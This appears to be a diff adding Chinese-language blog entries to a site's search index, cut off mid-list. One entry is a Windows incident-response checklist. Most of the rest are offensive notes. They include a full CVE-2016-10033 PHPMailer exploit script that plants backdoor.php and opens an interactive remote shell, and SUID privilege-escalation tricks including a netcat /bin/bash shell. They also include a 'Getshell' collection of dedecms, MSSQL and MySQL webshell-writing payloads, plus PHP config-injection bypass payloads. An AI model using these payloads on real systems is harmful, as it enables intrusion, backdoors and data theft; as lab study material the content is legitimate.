@@ -1,6 +1,1028 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Windows安全</title>
+    <url>/Windows%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><ol>
+<li>测试环境：windows server 2008 R2</li>
+</ol>
+<h2 id="0x10-应急响应之账号"><a href="#0x10-应急响应之账号" class="headerlink" title="0x10 应急响应之账号"></a>0x10 应急响应之账号</h2><h3 id="0x11-检查登录用户与弱口令"><a href="#0x11-检查登录用户与弱口令" class="headerlink" title="0x11 检查登录用户与弱口令"></a>0x11 检查登录用户与弱口令</h3><ol>
+<li>咨询主机或服务器的管理员，所有用户是否属于常见账户（Administrator、admin等等）或是否存在某种规律（user1、user2等等），所有用户密码是否存在弱口令（123456、qwerty等等）。</li>
+</ol>
+<h3 id="0x12-检查可疑用户"><a href="#0x12-检查可疑用户" class="headerlink" title="0x12 检查可疑用户"></a>0x12 检查可疑用户</h3><ol>
+<li>运行Lusrmgr.msc——组——Administrator——查看Administrator组下是否存在其他用户</li>
+</ol>
+<h3 id="0x13-检查隐藏用户"><a href="#0x13-检查隐藏用户" class="headerlink" title="0x13 检查隐藏用户"></a>0x13 检查隐藏用户</h3><ol>
+<li>运行regedit</li>
+<li>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</li>
+</ol>
+<h3 id="0x14-日志分析用户异常登陆"><a href="#0x14-日志分析用户异常登陆" class="headerlink" title="0x14 日志分析用户异常登陆"></a>0x14 日志分析用户异常登陆</h3><ol>
+<li>运行eventvwr.msc——windows日志——右键安全——筛选当前日志——输入事件ID（登录是：4624）——可直观查看</li>
+<li>或者运行eventvwr.msc——windows日志——右键安全——将所有事件另存为——保存后——命令行查询</li>
+<li>可视化查看所有事件：</li>
+<li>Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM C:\\login.evtx”</li>
+<li>可视化查看登录失败日志：</li>
+<li>Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM C:\\login.evtx where EventID=4625”</li>
+<li>可视化查看登录失败的登录时间，登录用户，登录IP信息</li>
+<li>LogParser.exe -i:EVT –o:DATAGRID “SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,’|’) as username,EXTRACT_TOKEN(Strings,19,’|’) AS SIP FROM C:\\login.evtx where EventID=4625”</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/1.png" alt="事件ID"></li>
+<li></li>
+<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">Log Parser</a></li>
+<li>可以通过可视化工具<strong>Log Parser Lizard</strong>，搜索查询登录情况</li>
+</ol>
+<h3 id="0x15-安全工具扫描"><a href="#0x15-安全工具扫描" class="headerlink" title="0x15 安全工具扫描"></a>0x15 安全工具扫描</h3><ol>
+<li><a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾</a>查杀</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/2.png" alt></li>
+</ol>
+<h2 id="0x20-应急响应之网络与进程"><a href="#0x20-应急响应之网络与进程" class="headerlink" title="0x20 应急响应之网络与进程"></a>0x20 应急响应之网络与进程</h2><h3 id="0x21-检查网络拓扑与流量行为"><a href="#0x21-检查网络拓扑与流量行为" class="headerlink" title="0x21 检查网络拓扑与流量行为"></a>0x21 检查网络拓扑与流量行为</h3><ol>
+<li>咨询管理员，主机或服务器是否对公网开放。</li>
+</ol>
+<h3 id="0x22-检查网络端口连接情况"><a href="#0x22-检查网络端口连接情况" class="headerlink" title="0x22 检查网络端口连接情况"></a>0x22 检查网络端口连接情况</h3><ol>
+<li>netstat -ano </li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/3.png" alt></li>
+<li>关注状态为：ESTABLISHED</li>
+<li>netstat -ano | findstr “ESTABLISHED”</li>
+<li>也可以查看相关端口的，如端口为3389</li>
+<li>netstat -ano | findstr “3389”</li>
+<li></li>
+<li>netstat查出PID后，使用tasklist定位进程，如PID为12345</li>
+<li>tasklist | findstr “12345”</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/4.png" alt></li>
+<li></li>
+<li>再运行msinfo32——软件环境——正在运行任务——查看相关进程的信息（路径、开始时间等等）</li>
+</ol>
+<h3 id="0x23-可疑进程"><a href="#0x23-可疑进程" class="headerlink" title="0x23 可疑进程"></a>0x23 可疑进程</h3><ol>
+<li>占用CPU过高的进程</li>
+<li>没有描述信息的进程</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/8.png" alt></li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/7.png" alt></li>
+<li>没有签名验证信息的进程</li>
+<li>进程路径是否可疑</li>
+<li>进程的属主</li>
+</ol>
+<h3 id="0x24-安全工具扫描"><a href="#0x24-安全工具扫描" class="headerlink" title="0x24 安全工具扫描"></a>0x24 安全工具扫描</h3><ol>
+<li><a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾</a>查杀</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/5.png" alt></li>
+<li></li>
+<li>微软的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer</a>来排查</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/6.png" alt></li>
+</ol>
+<h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h3><ol>
+<li>taskkill /f /pid PID</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/9.png" alt></li>
+<li>tskill PID</li>
+<li><img src="/Windows%E5%AE%89%E5%85%A8/10.png" alt></li>
+</ol>
+<h2 id="0x30-应急响应之启动、计划任务、服务"><a href="#0x30-应急响应之启动、计划任务、服务" class="headerlink" title="0x30 应急响应之启动、计划任务、服务"></a>0x30 应急响应之启动、计划任务、服务</h2><h3 id="0x31-开机启动"><a href="#0x31-开机启动" class="headerlink" title="0x31 开机启动"></a>0x31 开机启动</h3><ol>
+<li>开始——所有程序——启动，一般为空，检查是否存在程序在此目录</li>
+<li>或者 运行msconfig——启动——检查是否存在非法开机启动程序</li>
+<li>或者 任务管理器——启动——检查是否存在非法开机启动程序</li>
+<li>或者 查看注册表开机启动项：</li>
+<li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</li>
+<li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
+<li>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+<li>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</li>
+<li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder</li>
+<li>运行gpedit.msc——windows设置——脚本（启动/关机）</li>
+</ol>
+<h3 id="0x32-计划任务"><a href="#0x32-计划任务" class="headerlink" title="0x32 计划任务"></a>0x32 计划任务</h3><ol>
+<li>开始——控制面板——管理工具——任务计划程序，查看计划任务属性</li>
+</ol>
+<h3 id="0x33-自启动服务"><a href="#0x33-自启动服务" class="headerlink" title="0x33 自启动服务"></a>0x33 自启动服务</h3><ol>
+<li>运行services.msc——查看可疑服务与正在运行状态的服务</li>
+</ol>
+<h2 id="0x40-应急响应之系统信息、目录文件"><a href="#0x40-应急响应之系统信息、目录文件" class="headerlink" title="0x40 应急响应之系统信息、目录文件"></a>0x40 应急响应之系统信息、目录文件</h2><h3 id="0x41-系统版本与补丁"><a href="#0x41-系统版本与补丁" class="headerlink" title="0x41 系统版本与补丁"></a>0x41 系统版本与补丁</h3><ol>
+<li>运行systeminfo，查看系统信息</li>
+</ol>
+<h3 id="0x42-可疑目录与文件"><a href="#0x42-可疑目录与文件" class="headerlink" title="0x42 可疑目录与文件"></a>0x42 可疑目录与文件</h3><ol>
+<li>新建用户会在C:\Users目录下</li>
+<li>运行%userprofile%\recent，查看用户最近打开的可疑文件</li>
+<li>在各目录查看最近时间被操作的文件</li>
+</ol>
+<h2 id="0x50-应急响应之日志"><a href="#0x50-应急响应之日志" class="headerlink" title="0x50 应急响应之日志"></a>0x50 应急响应之日志</h2><h3 id="0x51-日志分析"><a href="#0x51-日志分析" class="headerlink" title="0x51 日志分析"></a>0x51 日志分析</h3><ol>
+<li>检查主机或服务器是否开启审核策略</li>
+<li>运行eventvwr.msc——事件查看器——windows日志——导出 应用程序/安全/系统 日志，然后分析</li>
+<li>进入网站目录，拷贝web日志，然后分析</li>
+<li>或者 查看日志服务器进行分析。</li>
+</ol>
+<h2 id="0x60-应急响应之安全软件"><a href="#0x60-应急响应之安全软件" class="headerlink" title="0x60 应急响应之安全软件"></a>0x60 应急响应之安全软件</h2><h3 id="0x61-安全软件"><a href="#0x61-安全软件" class="headerlink" title="0x61 安全软件"></a>0x61 安全软件</h3><ol>
+<li>下载安装最新版安全软件，或者离线更新软件版本及病毒库，然后备份再全盘扫描。</li>
+</ol>
+<h3 id="0x62-webshell查杀"><a href="#0x62-webshell查杀" class="headerlink" title="0x62 webshell查杀"></a>0x62 webshell查杀</h3><ol>
+<li>下载webshell查杀工具对web目录进行离线查杀</li>
+<li>或 拷贝可疑文件或者整个目录（<strong>不建议</strong>），上传到在线查杀网站进行查杀</li>
+</ol>
+<h3 id="0x63-一些webshell查杀工具"><a href="#0x63-一些webshell查杀工具" class="headerlink" title="0x63 一些webshell查杀工具"></a>0x63 一些webshell查杀工具</h3><ol>
+<li><a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾防火墙</a></li>
+<li><a href="https://scanner.baidu.com/#/pages/intro" target="_blank" rel="noopener">WEBDIR+</a></li>
+<li><a href="http://www.shelldetector.com/" target="_blank" rel="noopener">Web Shell Detector</a></li>
+<li><a href="http://sec.sangfor.com.cn/download?file=WebShellKillerTool.rar" target="_blank" rel="noopener">WebShellkiller</a></li>
+<li><a href="https://www.shellpub.com/" target="_blank" rel="noopener">SHELLPUB.COM专注查杀</a></li>
+<li><a href="https://github.com/jvoisin/php-malware-finder" target="_blank" rel="noopener">php-malware-finder</a></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>应急响应</tag>
+        <tag>windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHPMailer漏洞</title>
+    <url>/PHPMailer%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x00-PHPMailer"><a href="#0x00-PHPMailer" class="headerlink" title="0x00 PHPMailer"></a>0x00 PHPMailer</h2><h2 id="任意文件读取漏洞（CVE-2017-5223）"><a href="#任意文件读取漏洞（CVE-2017-5223）" class="headerlink" title="任意文件读取漏洞（CVE-2017-5223）"></a>任意文件读取漏洞（CVE-2017-5223）</h2><ol>
+<li>PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（<img src="/PHPMailer%E6%BC%8F%E6%B4%9E/...">），并将其src属性的值提取出来作为附件。</li>
+<li>可以利用<img src="/PHPMailer%E6%BC%8F%E6%B4%9E/passwd">将文件/etc/passwd作为附件读取出来，造成任意文件读取漏洞。</li>
+</ol>
+<h2 id="远程命令执行（CVE-2016-10033）"><a href="#远程命令执行（CVE-2016-10033）" class="headerlink" title="远程命令执行（CVE-2016-10033）"></a>远程命令执行（CVE-2016-10033）</h2><ol>
+<li>docker search cve-2016-10033</li>
+<li>docker pull vulnerables/cve-2016-10033</li>
+<li><img src="/PHPMailer%E6%BC%8F%E6%B4%9E/2.png" alt></li>
+<li>浏览器访问：<a href="http://IP:8080/" target="_blank" rel="noopener">http://IP:8080/</a></li>
+<li><img src="/PHPMailer%E6%BC%8F%E6%B4%9E/1.png" alt></li>
+<li><img src="/PHPMailer%E6%BC%8F%E6%B4%9E/3.png" alt></li>
+</ol>
+<p><strong>EXP:phpmailer.sh</strong></p>
+<pre><code>#!/bin/bash
+# CVE-2016-10033 exploit by opsxcq
+# https://github.com/opsxcq/exploit-CVE-2016-10033
+
+echo &#39;[+] CVE-2016-10033 exploit by opsxcq&#39;
+
+if [ -z &quot;$1&quot; ]
+then
+    echo &#39;[-] Please inform an host as parameter&#39;
+    exit -1
+fi
+
+if [ $(uname) == &#39;Darwin&#39; ]
+then
+    decoder=&#39;base64 -D&#39;
+elif [ $(uname) == &#39;Linux&#39; ]
+then
+    decoder=&#39;base64 -d&#39;  
+else
+    echo &#39;[-] Your platform isnt supported: &#39;$(uname)
+    exit -1
+fi
+
+
+host=$1
+
+echo &#39;[+] Exploiting &#39;$host
+
+curl -sq &#39;http://&#39;$host -H &#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe&#39; --data-binary $&#39;------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;action&quot;\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;name&quot;\r\n\r\n&lt;?php echo &quot;|&quot;.base64_encode(system(base64_decode($_GET[&quot;cmd&quot;]))).&quot;|&quot;; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;email&quot;\r\n\r\n\&quot;vulnerables\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;message&quot;\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n&#39; &gt;/dev/null &amp;&amp; echo &#39;[+] Target exploited, acessing shell at http://&#39;$host&#39;/backdoor.php&#39;
+
+
+echo &#39;[+] Checking if the backdoor was created on target system&#39;
+code=$(curl -o /dev/null --silent --head --write-out &#39;%{http_code}\n&#39; &quot;http://$host/backdoor.php&quot;)
+
+if [ &quot;$code&quot; != &quot;200&quot; ]
+then
+    echo &#39;[-] Target cant be exploited&#39;
+    exit -1
+else
+    echo &#39;[+] Backdoor.php found on remote system&#39;
+fi
+
+cmd=&#39;whoami&#39;
+while [ &quot;$cmd&quot; != &#39;exit&#39; ]
+do
+    echo &#39;[+] Running &#39;$cmd
+    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep &#39;|&#39; | grep -v &#39;base64_encode&#39; | head -n 1 | cut -d &#39;|&#39; -f 2 | $decoder 
+    then
+        echo &#39;[-] Connection problens&#39;
+        exit -1
+    fi
+    echo
+    read -p &#39;RemoteShell&gt; &#39; cmd
+done
+echo &#39;[+] Exiting&#39;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></li>
+<li><a href="https://vulhub.org/#/environments/phpmailer/CVE-2017-5223/" target="_blank" rel="noopener">https://vulhub.org/#/environments/phpmailer/CVE-2017-5223/</a></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>提权之linux-suid</title>
+    <url>/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/</url>
+    <content><![CDATA[<h2 id="0x00-suid提权"><a href="#0x00-suid提权" class="headerlink" title="0x00 suid提权"></a>0x00 suid提权</h2><ol>
+<li>suid：set user id ，suid是Linux的一种权限机制，具有该权限的文件在被执行时，使用者会暂时获取文件拥有者的权限。</li>
+<li>sgid：set group id</li>
+<li>ls -l #查看文件权限</li>
+<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/1.png" alt></li>
+<li>0 1 2 3 4 5 6 7 8 9</li>
+<li><ul>
+<li>r w s r - x r - x</li>
+</ul>
+</li>
+<li>0：代表文件类型：</li>
+<li><ul>
+<li>p：命名管道文件</li>
+</ul>
+</li>
+<li><ul>
+<li>d：目录文件</li>
+</ul>
+</li>
+<li><ul>
+<li>l：符合连接文件</li>
+</ul>
+</li>
+<li><ul>
+<li>-：普通文件</li>
+</ul>
+</li>
+<li><ul>
+<li>s：socket文件</li>
+</ul>
+</li>
+<li><ul>
+<li>c：字符设备文件</li>
+</ul>
+</li>
+<li><ul>
+<li>b：块设备文件</li>
+</ul>
+</li>
+<li>1-3：文件所有者的权限，4-6:组用户的权限，7-9：用户的权限</li>
+<li>r：可读，w：可写，x：可执行，-：无权限</li>
+</ol>
+<p><strong>查找所有suid可执行文件</strong></p>
+<pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
+find /  -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></pre><p><strong>具有suid的命令</strong></p>
+<ul>
+<li>sudo</li>
+<li>passwd</li>
+<li>mount</li>
+<li>ping</li>
+<li>su</li>
+<li>…</li>
+</ul>
+<p><strong>nmap 旧版本2.02-5.2.1有交互模式</strong></p>
+<pre><code>nmap --interactive
+!sh
+id
+
+metasploit模块：exploit/unix/local/setuid_nmap </code></pre><p><strong>find</strong></p>
+<ol>
+<li>自主赋权</li>
+<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/2.png" alt></li>
+<li>find test123 -exec whoami ;</li>
+<li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/3.png" alt></li>
+<li>反弹shell：find test123 -exec netcat -lvp 6666 -e /bin/bash ;</li>
+</ol>
+<p><strong>vim.tiny</strong></p>
+<ol>
+<li>自主赋权（图略）</li>
+<li>cat /etc/shadow #无权限</li>
+<li>vim.tiny /etc/shadow #可读</li>
+<li>vim.tiny</li>
+<li>:set shell=/bin/bash</li>
+<li>:shell</li>
+</ol>
+<p><strong>bash</strong></p>
+<ol>
+<li>自主赋权（图略）</li>
+<li>bash -p</li>
+<li>id</li>
+</ol>
+<p><strong>less/more</strong></p>
+<ol>
+<li>less /etc/passwd</li>
+<li>!/bin/sh</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Getshell集合</title>
+    <url>/Getshell%E9%9B%86%E5%90%88/</url>
+    <content><![CDATA[<h2 id="0x00-前"><a href="#0x00-前" class="headerlink" title="0x00 前"></a>0x00 前</h2><p><strong>dedecms（后台登陆后）</strong></p>
+<ul>
+<li>文件式管理器——直接文件上传webshell</li>
+<li><img src="/Getshell%E9%9B%86%E5%90%88/1.png" alt></li>
+<li>权限原因只能限制在当前目录，通过改名，test.php改为../test.php来跳转目录</li>
+<li><img src="/Getshell%E9%9B%86%E5%90%88/2.png" alt></li>
+</ul>
+<pre><code>需登录
+http://192.168.100.3/dedecms/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=1&amp;refiles[1]=\%22;eval($_GET[test]);die();//
+http://192.168.100.3/dedecms/dede/sys_verifies.php?action=down&amp;test=phpinfo();</code></pre><p><img src="/Getshell%E9%9B%86%E5%90%88/3.png" alt><br><img src="/Getshell%E9%9B%86%E5%90%88/6.png" alt></p>
+<pre><code>http://192.168.100.3/dedecms/dede/sys_info.php</code></pre><p><img src="/Getshell%E9%9B%86%E5%90%88/4.png" alt><br><img src="/Getshell%E9%9B%86%E5%90%88/5.png" alt></p>
+<pre><code>http://192.168.100.3/dedecms/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=&lt;?php+@system($_GET[cmd])?&gt;&amp;token=&lt;your_token&gt; #
+http://192.168.100.3/dedecms/include/taglib/test.lib.php?cmd=whoami</code></pre><p><img src="/Getshell%E9%9B%86%E5%90%88/7.png" alt></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="https://xz.aliyun.com/t/2071" target="_blank" rel="noopener">https://xz.aliyun.com/t/2071</a></li>
+</ol>
+<p><strong>mssql</strong></p>
+<pre><code>create table ccc(ddd varchar(99))
+insert into ccc(ddd) values(&#39;&lt;%eval request(&quot;test&quot;)%&gt;&#39;)
+select * into [ddd] in &#39;c:/www/test.asp;test.xls&#39; &#39;excel 4.0;&#39; from ccc
+drop table ccc</code></pre><pre><code>exec sp_makewebtask &#39;c:/test.php&#39;,&#39;select &quot;&lt;%eval request(&quot;test&quot;)%&gt;&quot;&#39;</code></pre><p><strong>mysql加载与导出文件（具有可写路径与可写权限）</strong></p>
+<pre><code>select load_file(&#39;/etc/passwd&#39;);
+select load_file(&#39;c:/windows/win.ini&#39;);
+select 1,2,0x3C3F706870206576616C28245F504F53545B746573745D293B3F3E into outfile &#39;C:/phpStudy/PHPTutorial/WWW/test.php&#39;%23 
+select 1,2,0x3C3F706870206576616C28245F504F53545B746573745D293B3F3E into outfile &#39;/var/www/html/test.php&#39;%23 
+select 1,2,0x3C3F706870206576616C28245F504F53545B746573745D293B3F3E into dumpfile &#39;C:/phpStudy/PHPTutorial/WWW/test1.php&#39;%23 
+0x3C3F706870206576616C28245F504F53545B746573745D293B3F3E &lt;?php eval($_POST[test]);?&gt;</code></pre><p><strong>mysql-phpmyadmin</strong></p>
+<pre><code>create table aaa(bbb text not null); #建表aaa，列bbb
+insert into aaa(bbb) values(&#39;&lt;?php eval($_POST[test])?&gt;&#39;); #插入值到aaa表bbb列
+select bbb from aaa into outfile &quot;C:/phpStudy/PHPTutorial/WWW/test.php&quot;; #导出值到文件
+drop table if exists aaa;  #删除表</code></pre>]]></content>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP之配置漏洞</title>
+    <url>/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="0x00-PHP配置漏洞"><a href="#0x00-PHP配置漏洞" class="headerlink" title="0x00 PHP配置漏洞"></a>0x00 PHP配置漏洞</h2><p><strong>冬夜读书示子聿</strong> ——陆游（宋）</p>
+<p>古人学问无遗力，少壮工夫老始成。<br>纸上得来终觉浅，绝知此事要躬行。</p>
+<h2 id="0x01-基础版"><a href="#0x01-基础版" class="headerlink" title="0x01 基础版"></a>0x01 基础版</h2><ol>
+<li>特点：正则贪婪模式，无S单行模式：</li>
+<li>环境准备：</li>
+</ol>
+<p><strong>test.php</strong></p>
+<pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/\\\$API=&#39;.*&#39;;/&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><p><strong>test1.php</strong></p>
+<pre><code>$API=&#39;&#39;;</code></pre><ol>
+<li>访问测试：<a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/1.png" alt></li>
+<li>值 1 已写入到文件</li>
+<li>利用换行符 %0a 绕过正则测试：<a href="http://127.0.0.1/test.php?api=1%27;%0a" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;%0a</a>&lt;?php%0aphpinfo();//</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/2.png" alt></li>
+<li>test1.php被写入内容：</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/3.png" alt></li>
+<li>访问test1.php</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/4.png" alt></li>
+</ol>
+<p><strong>test1.php</strong></p>
+<pre><code>&lt;?php
+$API=&#39;&#39;;</code></pre><ol>
+<li>测试2</li>
+<li>访问：<a href="http://127.0.0.1/test.php?api=2%27;%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=2%27;%0aphpinfo();//</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/5.png" alt></li>
+<li>phpinfo()已换行写入，但是在单引号中，只当作字符串。</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/6.png" alt></li>
+<li>再访问：<a href="http://127.0.0.1/test.php?api=2" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=2</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/7.png" alt></li>
+<li>然后利用原闭合单引号来闭合</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/8.png" alt></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/9.png" alt></li>
+</ol>
+<h2 id="0x02-单行模式"><a href="#0x02-单行模式" class="headerlink" title="0x02 单行模式"></a>0x02 单行模式</h2><ol>
+<li>特点：正则贪婪模式，正则添加s修饰符，防止换行绕过</li>
+<li>s：匹配任何空白字符（空格 ，制表符\t，垂直制表符\v，换页符\f，换行符\n）</li>
+<li>环境准备：</li>
+</ol>
+<p><strong>test.php</strong></p>
+<pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/\\\$API=&#39;.*&#39;;/s&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><p><strong>test1.php</strong></p>
+<pre><code>&lt;?php 
+$API=&#39;&#39;;</code></pre><ol>
+<li>访问测试：<a href="http://127.0.0.1/test.php?api=;phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=;phpinfo()</a>;</li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/10.png" alt></li>
+<li>利用正则替换（$0）来绕过：<a href="http://127.0.0.1/test.php?api=$0" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=$0</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/11.png" alt></li>
+</ol>
+<h2 id="0x03-基础版非贪婪模式"><a href="#0x03-基础版非贪婪模式" class="headerlink" title="0x03 基础版非贪婪模式"></a>0x03 基础版非贪婪模式</h2><pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/\\\$API=&#39;.*?&#39;;/&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php 
+$API=&#39;&#39;;</code></pre><p><strong>与基础版一样</strong></p>
+<ol>
+<li><a href="http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//</a></li>
+<li><a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li>
+</ol>
+<h2 id="0x04-单行非贪婪模式"><a href="#0x04-单行非贪婪模式" class="headerlink" title="0x04 单行非贪婪模式"></a>0x04 单行非贪婪模式</h2><pre><code>&lt;?php 
+$api=addslashes($_GET[&#39;api&#39;]);
+print_r($api);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=file_get_contents(&#39;./test1.php&#39;);
+print_r($file);
+echo &quot;&lt;br&gt;&quot;;
+
+$file=preg_replace(&quot;/\\\$API=&#39;.*?&#39;;/s&quot;,&quot;\$API=&#39;{$api}&#39;;&quot;,$file);
+var_dump($file);
+
+file_put_contents(&#39;./test1.php&#39;,$file);</code></pre><pre><code>&lt;?php 
+$API=&#39;&#39;;</code></pre><p><strong>测试1</strong></p>
+<ol>
+<li><a href="http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;%0aphpinfo();//</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/12.png" alt></li>
+<li><a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/13.png" alt></li>
+</ol>
+<p><strong>测试2</strong></p>
+<ol>
+<li><a href="http://127.0.0.1/test.php?api=1%27;phpinfo();//" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1%27;phpinfo();//</a> </li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/14.png" alt></li>
+<li><a href="http://127.0.0.1/test.php?api=1" target="_blank" rel="noopener">http://127.0.0.1/test.php?api=1</a></li>
+<li><img src="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/15.png" alt></li>
+<li>或者</li>
